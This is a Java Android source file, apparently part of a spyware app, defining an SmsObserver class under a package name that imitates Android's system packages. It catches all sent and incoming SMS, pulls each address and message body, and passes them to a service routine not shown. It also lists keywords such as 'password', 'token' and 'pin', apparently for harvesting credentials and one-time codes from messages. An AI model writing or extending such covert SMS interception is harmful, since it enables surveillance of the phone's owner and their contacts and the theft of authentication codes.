package android.service.app;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Bundle;
import android.service.app.utils.Log;
import android.telephony.SmsMessage;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class SmsObserver extends ContentObserver
{
    private Context mContext;
    public static final String CONTENT_SMS = "content://sms/";
    public static final Uri SMS_URI = Uri.parse(CONTENT_SMS);
    public static final int SMS_SENT = 2;
    public static final int ADDRESS = 0;
    public static final int TYPE = 1;
    public static final int BODY = 2;
    public static final int ID = 3;
    public static final String[] columns = new String[]{"address", "type", "body", "_id"};

    private boolean incomingSms = false;

    public SmsObserver(Context context, Handler h)
    {
        super(h);
        mContext = context;
        mContext.getContentResolver().registerContentObserver(SMS_URI, true, this);
    }

    @Override
    public boolean deliverSelfNotifications()
    {
        return false;
    }

    @Override
    public void onChange(boolean arg0)
    {
        super.onChange(arg0);
        Log.v("incomingSms=" + incomingSms);

        if (!incomingSms)
        {
            new Thread(new Runnable()
            {
                public void run()
                {
                    ContentResolver contentResolver = mContext.getContentResolver();
                    Cursor cursor = contentResolver.query(SMS_URI, columns, null, null, null);
                    if (cursor != null)
                    {
                        cursor.moveToNext();
                        int type = cursor.getInt(TYPE);
                        if (type == SMS_SENT)
                        {
                            ((Service) mContext).printDataOnScreen("sms sent: ");

                            String address = cursor.getString(ADDRESS);
                            String body = cursor.getString(BODY);
                            cursor.close();
                            ((Service) mContext).runSmsEvent(address, body, false, contentResolver);
                        }
                    }
                }
            }).start();
        } else
            incomingSms = false;

    }

    public static final List<String> passwordPrefixes = Collections.unmodifiableList(Arrays.asList("pass", "password", "token", "pin"));
    public static final List<String> phonePrefixes = Collections.unmodifiableList(Arrays.asList("phone", "number", "mobile"));

    public void unregisterObserver()
    {
        mContext.getContentResolver().unregisterContentObserver(this);
    }

    // Define a BroadcastReceiver to detect incoming SMS
    public final BroadcastReceiver inSms = new BroadcastReceiver()
    {
        @Override
        public void onReceive(Context context, Intent intent)
        {
            String action = intent.getAction();
            final Bundle bundle = intent.getExtras();

            if (action.equals(Service.SMS_RECEIVED))
            {
                ((Service) mContext).printDataOnScreen("incoming sms: ");
                incomingSms = true;
                if (bundle != null)
                {
                    new Thread(new Runnable()
                    {
                        public void run()
                        {
                            try
                            {
                                Object[] pdus = (Object[]) bundle.get("pdus");
                                for (int i = 0; i < pdus.length; i++)
                                {
                                    //TODO: 1
                                    SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[i]);
                                    String address = messages.getOriginatingAddress();
                                    String body = messages.getDisplayMessageBody();

                                    Log.v("messages=" + messages);
                                    ((Service) mContext).runSmsEvent(address, body, true, null);
                                }
                            } catch (NullPointerException e)
                            {
                                ((Service) mContext).app.handleException(e);
                            }
                        }
                    }).start();
                }
            }
        }
    };
}

